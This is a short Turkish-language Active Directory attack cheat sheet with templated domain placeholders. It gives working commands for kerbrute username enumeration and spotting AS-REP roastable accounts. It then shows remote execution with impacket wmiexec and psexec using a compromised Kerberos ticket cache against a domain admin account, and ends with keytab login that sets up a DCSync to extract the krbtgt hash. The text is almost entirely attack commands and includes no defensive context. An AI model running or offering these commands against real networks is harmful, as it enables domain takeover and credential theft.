# 1. Ham kelime listesinden geçerli kullanıcıları damıtma (Sıfır kilitlenme riski)
kerbrute userenum -d {{domain}} --dc 10.10.10.5 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 -o valid_users.txt

# 2. Çıktı Analizi:
# [+] VALID USERNAME:  {{user}}.yilmaz@{{domain}}
# [+] VALID USERNAME:  {{user}}.oz@{{domain}}
# [+] {{user}}@{{domain}} has no pre-auth required! AS-REP: $krb5asrep$23$...

# 1. Biletin geçerli olduğu etki alanında uzak komut çalıştırma (WMI / SMB)
export KRB5CCNAME=/tmp/compromised_ccache
impacket-wmiexec -k -no-pass {{domain}}/da_user@dc01.{{domain}}

# 2. PsExec ile SYSTEM oturumu alma
impacket-psexec -k -no-pass {{domain}}/da_user@srv-files01.{{domain}}

# 1. Keytab ile makine oturumu açma
kinit -k -t /etc/krb5.keytab LINUX01$@{{domain}}

# 2. Bilet üzerinden doğrudan DCSync gerçekleştirerek krbtgt hash'ini çekme
export KRB5CCNAME=/tmp/krb5cc_0
